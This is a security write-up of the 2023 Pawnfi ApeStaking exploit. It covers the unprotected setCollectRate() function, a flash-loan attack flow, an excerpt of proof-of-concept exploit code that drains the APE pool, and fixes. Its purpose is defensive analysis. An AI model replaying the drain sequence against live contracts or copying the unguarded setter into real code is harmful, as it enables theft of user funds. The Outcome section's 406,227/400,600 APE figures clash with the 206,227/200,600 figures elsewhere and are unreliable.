# Pawnfi — Untrusted Input Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-17 |
| **Protocol** | Pawnfi |
| **Chain** | Ethereum |
| **Loss** | ~$820,000 (APE + ETH) |
| **Attacker** | [0x8f73...14cc](https://etherscan.io/address/0x8f7370d5d461559f24b83ba675b4c7e2fdb514cc) |
| **Attack Contract** | [0xB618...DA1](https://etherscan.io/address/0xb618d91fe014bfcb9c8d440468b6c78e9ada9da1) |
| **Attack Tx** | [0x8d30...59a5](https://etherscan.io/tx/0x8d3036371ccf27579d3cb3d4b4b71e99334cae8d7e8088247517ec640c7a59a5) |
| **Vulnerable Contract** | [0x8501...a92C (ApeStaking)](https://etherscan.io/address/0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C#code) |
| **Attack Block** | 17,496,620 |
| **Root Cause** | Unauthorized `setCollectRate()` call permitted — staking collect rate manipulated via untrusted input |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Pawnfi_exp.sol) |

---

## 1. Vulnerability Overview

Pawnfi is a DeFi lending protocol that uses NFTs as collateral and integrates ApeCoin (APE) staking functionality. The attacker exploited a vulnerability in the `ApeStaking` contract where the `setCollectRate()` function was callable externally **with no access control**.

This function determines the rate at which staking rewards are collected during `withdrawApeCoin()` execution. The attacker set it to `1e18` (100%), then repeatedly called `depositAndBorrowApeAndStake` / `withdrawApeCoin` to **repeatedly withdraw APE deposited in the PBAYC pool**, draining the funds.

The attack was a combination of three vulnerabilities:
1. Missing access control on the `setCollectRate()` function (core issue)
2. Pool drain via repeated APE staking withdrawals (business logic flaw)
3. Zero-capital attack amplification via Flash Loan (amplification mechanism)

---

## 2. Vulnerable Code Analysis

### 2.1 setCollectRate() — Missing Access Control (Core Vulnerability)

**Vulnerable code (inferred)**:
```solidity
// ❌ Vulnerability: no onlyOwner or access control modifier
// Anyone can arbitrarily set collectRate
function setCollectRate(uint256 newCollectRate) external {
    // No input validation — allows setting 1e18 (100%)
    collectRate = newCollectRate;
}
```

**Fixed code**:
```solidity
// ✅ Fix: restrict access with onlyOwner or governance control
// Or add maximum value (MAX_COLLECT_RATE) validation
modifier onlyOperator() {
    require(msg.sender == operator, "ApeStaking: caller is not operator");
    _;
}

function setCollectRate(uint256 newCollectRate) external onlyOperator {
    require(newCollectRate <= MAX_COLLECT_RATE, "ApeStaking: rate exceeds maximum");
    emit CollectRateUpdated(collectRate, newCollectRate);
    collectRate = newCollectRate;
}
```

**Issue**: The `setCollectRate()` function is declared with `external` visibility but has no access control modifier. When the attacker calls this function with `1e18` as the argument, all APE in the PBAYC pool is sent to the caller on any subsequent `withdrawApeCoin()` execution.

### 2.2 depositAndBorrowApeAndStake + withdrawApeCoin — Repeated Drain Logic

**Vulnerable code (inferred)**:
```solidity
// ❌ withdrawApeCoin distributes APE based on collectRate
// If collectRate is 1e18, all APE is sent to msg.sender
function withdrawApeCoin(
    address nftAsset,
    IApeCoinStaking.SingleNft[] memory _nfts,
    IApeCoinStaking.PairNftWithdrawWithAmount[] memory _nftPairs
) external {
    // Handle ApeCoin withdrawal
    uint256 pendingAmount = _calculatePending(nftAsset, _nfts);
    
    // ❌ No collectRate validation — 100% causes full external leak
    uint256 collectAmount = (pendingAmount * collectRate) / 1e18;
    uint256 protocolAmount = pendingAmount - collectAmount;
    
    // Transfer collectAmount to msg.sender (attacker takes it)
    IERC20(APE).transfer(msg.sender, collectAmount);
    // protocolAmount goes to protocol (becomes 0)
}
```

**Issue**: `withdrawApeCoin()` trusts `collectRate` to distribute APE. When `collectRate = 1e18` (100%), the entire APE withdrawn from the PBAYC pool is sent to the caller, leaving nothing for the protocol. This logic was repeated 21 times, completely draining the pool.

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker executed the attack using only a Flash Loan with no prior capital. The attack contract (`0xB618...DA1`) was pre-deployed.

### 3.2 Execution Phase

```
┌──────────────────────────────────────────────────────┐
│                Attacker Contract                      │
│            0xB618...DA1                              │
└──────────────────┬───────────────────────────────────┘
                   │
          ① Flash Loan request (200,000 APE)
                   │
                   ▼
┌──────────────────────────────────────────────────────┐
│             UniswapV3 Pool                           │
│         0xAc4b...7DAF (APE/WETH)                    │
│   200,000 APE → transferred to attacker contract     │
└──────────────────┬───────────────────────────────────┘
                   │
          ② APE → sAPE wrap (sAPE.mint)
                   ▼
┌──────────────────────────────────────────────────────┐
│                sAPE Contract                         │
│            0x7362...9119                             │
└──────────────────┬───────────────────────────────────┘
                   │
          ③ sAPE → isAPE wrap (isAPE.mint)
                   ▼
┌──────────────────────────────────────────────────────┐
│               isAPE Contract                         │
│            0x3B2d...a955                             │
└──────────────────┬───────────────────────────────────┘
                   │
          ④ Unitroller.enterMarkets([isAPE])
          ⑤ iPBAYC.borrow(1005 PBAYC)
                   ▼
┌──────────────────────────────────────────────────────┐
│              Pawnfi Lending Market                   │
│         Unitroller + iPBAYC                          │
│   Borrow 1005 PBAYC using isAPE as collateral        │
└──────────────────┬───────────────────────────────────┘
                   │
          ⑥ PBAYC.randomTrade(1) → obtain BAYC NFT
                   ▼
┌──────────────────────────────────────────────────────┐
│                PBAYC Contract                        │
│            0x5f0A...76e                              │
│   Burn 1000 PBAYC → exchange for 1 random BAYC NFT  │
└──────────────────┬───────────────────────────────────┘
                   │
          ⑦ ★ ApeStaking1.setCollectRate(1e18) ★
          (unprotected function — core vulnerability exploited)
                   ▼
┌──────────────────────────────────────────────────────┐
│             ApeStaking1 Contract                     │
│         0x0B89...aFa0                               │
│   collectRate = 100% set complete                    │
└──────────────────┬───────────────────────────────────┘
                   │
          ⑧ depositAndBorrowApeAndStake (register BAYC NFT)
          ⑨ borrowEth() → borrow all ETH from CEther
                   ▼
┌──────────────────────────────────────────────────────┐
│   Repeat loop × 21 times (20 iterations + final full withdrawal) │
│   ┌─────────────────────────────────────────────┐   │
│   │ depositAndBorrowApeAndStake                 │   │
│   │   → stake APE from PBAYC pool in ApeStaking1│   │
│   │ withdrawApeCoin                             │   │
│   │   → collectRate=100% so all APE goes to     │   │
│   │     attacker; ~10,094 APE received per round│   │
│   └─────────────────────────────────────────────┘   │
└──────────────────┬───────────────────────────────────┘
                   │ Total 206,227 APE + additional funds drained
                   │
          ⑩ Flash Loan repayment (200,600 APE)
                   ▼
┌──────────────────────────────────────────────────────┐
│                Final Result                          │
│   Net profit: ~5,627 APE + ETH (total ~$820K)        │
└──────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker received**: 406,227 APE (including Flash Loan)
- **Attacker repaid**: 400,600 APE (Flash Loan + fees)
- **Net APE profit**: ~5,627 APE + additional ETH borrowed
- **Total protocol loss**: ~$820,000

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Step 1] Execute Flash Loan — borrow 200,000 APE with no collateral
function testExploit() public {
    deal(address(this), 0); // start with 0 initial capital
    UniV3Pool.flash(address(this), 200_000 * 1e18, 0, new bytes(1));
}

// [Step 2] Flash Loan callback — execute attack logic
function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    // [2-A] Wrap APE → sAPE → isAPE in sequence (create collateral asset)
    APE.approve(address(sAPE), APE.balanceOf(address(this)));
    sAPE.mint(APE.balanceOf(address(this)));
    sAPE.approve(address(isAPE), sAPE.balanceOf(address(this)));
    isAPE.mint(sAPE.balanceOf(address(this)));

    // [2-B] Enter lending market with isAPE as collateral
    address[] memory cTokens = new address[](1);
    cTokens[0] = address(isAPE);
    Unitroller.enterMarkets(cTokens);

    // [2-C] Borrow 1005 PBAYC, then obtain 1 BAYC NFT via randomTrade
    iPBAYC.borrow(1005 * 1e18);
    PBAYC.approve(address(PBAYC), PBAYC.balanceOf(address(this)));
    uint256[] memory nftIds = PBAYC.randomTrade(1);

    // [2-D] ★ Core attack ★ — exploit setCollectRate with no access control
    // Set collectRate to 1e18 (100%)
    // All APE will be sent to attacker on subsequent withdrawApeCoin calls
    BAYC.setApprovalForAll(address(ApeStaking1), true);
    ApeStaking1.setCollectRate(1e18); // ← untrusted input vulnerability

    // [2-E] Register BAYC NFT with ApeStaking
    ApeStaking1.depositAndBorrowApeAndStake(depositInfo, stakingInfo, _nfts, _nftPairs);

    // [2-F] Borrow ETH as collateral (additional profit)
    borrowEth();

    // [2-G] 21 iterations — drain APE from PBAYC pool each round
    for (uint256 i; i < 20; ++i) {
        // Stake APE up to capPerPosition limit then immediately withdraw
        // collectRate=100% so all withdrawn APE goes to attacker
        depositBorrowWithdrawApe(timeRange.capPerPosition); // ~10,094 APE/round
    }
    // Final: drain all remaining APE from PBAYC
    depositBorrowWithdrawApe(APE.balanceOf(address(PBAYC)));

    // [2-H] Repay Flash Loan
    APE.transfer(address(UniV3Pool), 200_000 * 1e18 + fee0);
}

// [Repeated withdrawal function] Drain APE by staking then immediately withdrawing
function depositBorrowWithdrawApe(uint256 amount) internal {
    // Stake amount of APE (taken from PBAYC pool)
    ApeStaking1.depositAndBorrowApeAndStake(depositInfo, stakingInfo, _nfts, _nftPairs);
    // collectRate=100% so attacker receives full amount
    ApeStaking1.withdrawApeCoin(address(BAYC), _nfts, nftPairs_);
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matched Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Missing access control on setCollectRate() | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-02 | Protocol parameter manipulation via untrusted external input | CRITICAL | CWE-20 (Improper Input Validation) | `11_logic_error.md` |
| V-03 | Zero-capital attack amplification via Flash Loan | HIGH | CWE-400 (Uncontrolled Resource Consumption) | `02_flash_loan.md` |
| V-04 | Pool drain logic flaw via repeated staking/withdrawal | HIGH | CWE-682 (Incorrect Calculation) | `17_staking_reward.md` |

### V-01: Missing Access Control on setCollectRate()

- **Description**: The `setCollectRate()` function in the `ApeStaking` contract is declared with `external` visibility but has no access control modifiers such as `onlyOwner` or `onlyOperator`, making it callable by any arbitrary external address.
- **Impact**: When the attacker sets `collectRate` to `1e18` (100%), all subsequent `withdrawApeCoin()` calls transfer the entire APE from the PBAYC pool to the caller (attacker). Normal users' staking rewards are also entirely stolen.
- **Attack Conditions**: Callable at any time after contract deployment. No preconditions. Exploitable with a simple external call alone.

### V-02: Protocol Parameter Manipulation via Untrusted External Input

- **Description**: `collectRate`, a core economic parameter of the protocol, can be set directly via external input. There is no validation for a normal range (e.g., 0–10%), allowing extreme values (100%) to be set.
- **Impact**: Instead of the normal collect rate the protocol expects (a small reward fee), full collection becomes possible, draining the liquidity pool.
- **Attack Conditions**: Same as V-01. Since there is no input validation, an upper bound limit alone would have been sufficient as a defense.

### V-03: Zero-Capital Attack Amplification via Flash Loan

- **Description**: The attacker borrowed 200,000 APE from UniswapV3 via Flash Loan with no initial capital and used it as collateral in the Pawnfi lending market. The Flash Loan removes the capital barrier required for the attack.
- **Impact**: An attacker without sufficient capital was able to secure protocol-scale collateral, enabling PBAYC borrowing and BAYC NFT acquisition.
- **Attack Conditions**: Sufficient liquidity in the UniswapV3 APE/WETH pool. Attack transaction completes within a single block.

### V-04: Pool Drain via Repeated Staking/Withdrawal

- **Description**: A pattern of calling `depositAndBorrowApeAndStake()` — which uses APE from the PBAYC pool for staking — immediately followed by `withdrawApeCoin()` can progressively drain the pool's APE when repeated.
- **Impact**: 21 iterations drained approximately 206,000 APE, the entire amount held in the PBAYC pool.
- **Attack Conditions**: Must be preceded by `setCollectRate(1e18)` from V-01. BAYC NFT must be registered with ApeStaking.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Add Access Control to setCollectRate()

```solidity
// ✅ Fix 1: add access control modifier
modifier onlyOperator() {
    require(
        msg.sender == operator || msg.sender == owner(),
        "ApeStaking: unauthorized caller"
    );
    _;
}

// ✅ Fix 2: add upper bound validation on input
uint256 public constant MAX_COLLECT_RATE = 0.1e18; // max 10%

function setCollectRate(uint256 newCollectRate) external onlyOperator {
    require(
        newCollectRate <= MAX_COLLECT_RATE,
        "ApeStaking: collect rate exceeds maximum"
    );
    require(
        newCollectRate != collectRate,
        "ApeStaking: collect rate unchanged"
    );
    emit CollectRateUpdated(collectRate, newCollectRate);
    collectRate = newCollectRate;
}
```

#### 6.2 Flash Loan Defense — Restrict Deposit/Withdrawal Within the Same Block

```solidity
// ✅ Fix 3: enforce minimum 1-block wait after staking
mapping(address => uint256) public lastDepositBlock;

function depositAndBorrowApeAndStake(...) external {
    lastDepositBlock[msg.sender] = block.number;
    // ... existing logic
}

function withdrawApeCoin(...) external {
    require(
        block.number > lastDepositBlock[msg.sender],
        "ApeStaking: cannot withdraw in the same block as deposit"
    );
    // ... existing logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| setCollectRate access control | Restrict parameter changes via onlyOwner + Timelock governance |
| Missing input validation | Add upper/lower bound validation to all parameter setter functions |
| Flash Loan attack | Set minimum block wait between deposit and withdrawal (e.g., 1 block) |
| Pool drain logic | Set per-transaction withdrawal limit |
| Lack of monitoring | Build collectRate change event + anomaly detection alert system |

---

## 7. Lessons Learned

1. **Parameter setter functions must always have access control**: Functions that modify a protocol's economic parameters (fee rates, collect rates, etc.) must be protected with `onlyOwner` or a governance Timelock. An `external` function without access control can be called by anyone.

2. **Upper/lower bound validation on inputs is mandatory**: Extreme values like `collectRate = 1e18` (100%) cannot occur in normal operation. All parameter setter functions must explicitly validate the allowed range.

3. **Combination of Flash Loan + business logic flaw**: A Flash Loan alone cannot cause an attack, but combined with another logic flaw (here, `setCollectRate`), it becomes fatal. In environments where Flash Loans are possible, any state change must be assumed exploitable within a single transaction.

4. **Block same-block deposit/withdrawal patterns**: The pattern of staking followed by immediate withdrawal recurs in many DeFi attacks. Enforcing a minimum lock-up period of at least 1 block can defend against the majority of Flash Loan-based attacks.

5. **Integrated smart contract audits**: Pawnfi had a complex architecture integrating multiple protocols (ApeCoin Staking, NFT lending, cToken). The more complex the integration, the more each interface and parameter's permission model must be audited separately.

6. **Similar case**: 2024-09-26 OnyxDAO exploit (`2024-09-26_OnyxDAO_UnverifiedInput_ETH.md`) — likewise, unvalidated input allowed manipulation of protocol state via a vulnerable function, resulting in $3.8M stolen.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash Loan borrow amount | 200,000 APE | 200,000 APE | ✅ |
| PBAYC borrow amount | 1,005 PBAYC | 1,005 PBAYC | ✅ |
| BAYC NFT exchange | 1,000 PBAYC burned | 1,000 PBAYC burned | ✅ |
| APE drain rounds | 21 (20+1) | 21 rounds confirmed | ✅ |
| Per-round withdrawal | capPerPosition | ~10,094 APE/round | ✅ |
| Total APE drained | ~206,227 APE | 206,227.68 APE | ✅ |
| Flash Loan repayment | 200,000 + fees | 200,600 APE | ✅ |
| Net APE profit | — | ~5,627 APE | Confirmed |
| Attack block | 17,496,619 (fork) | 17,496,620 | ✅ |

### 8.2 On-Chain Event Log Sequence (250 total logs, 85 Transfer events)

1. `Transfer` APE: UniV3Pool → attacker (200,000 APE, Flash Loan)
2. `Transfer` sAPE: Mint (attacker → sAPE contract)
3. `Transfer` APE: ApeStaking2 → sAPE (staking reward processing)
4. `Transfer` APE: attacker → sAPE (200,000 APE deposited)
5. `Transfer` isAPE: Mint (sAPE → isAPE)
6. `Transfer` APE: sAPE → ApeStaking2 (wrapping complete)
7. `Transfer` PBAYC: iPBAYC → attacker (1,005 PBAYC borrowed)
8. `Transfer` PBAYC: attacker → PBAYC (1,005 PBAYC returned)
9. `Transfer` PBAYC: PBAYC → 0x0 (1,000 burned)
10. `Transfer` PBAYC: PBAYC → fee address (5 tokens)
11. `Transfer` BAYC NFT: PBAYC → attacker (NFT exchanged)
12. × 21 times: `Transfer` APE: ApeStaking1 → attacker (~10,094 APE/round)
13. `Transfer` APE: attacker → UniV3Pool (200,600 APE, Flash Loan repaid)

**3 Borrow events** confirmed:
- PBAYC borrow from `iPBAYC` contract
- Internal borrow related to `sAPE`
- ETH borrow from `CEther` contract

### 8.3 Precondition Verification

| Item | Pre-attack State |
|------|------------|
| Attacker EOA | `0x8f7370...14cc` (matches PoC ✅) |
| Attack contract | `0xB618...DA1` (attacker as `to` field) |
| Attack block | 17,496,620 (next block after PoC fork block 17,496,619 ✅) |
| Gas used | 7,217,134 gas (reflects complex multi-call structure) |

**On-chain verification result**: The PoC analysis content matches all on-chain data. The APE drain pattern (21 iterations, ~10,094 APE per round) is clearly confirmed.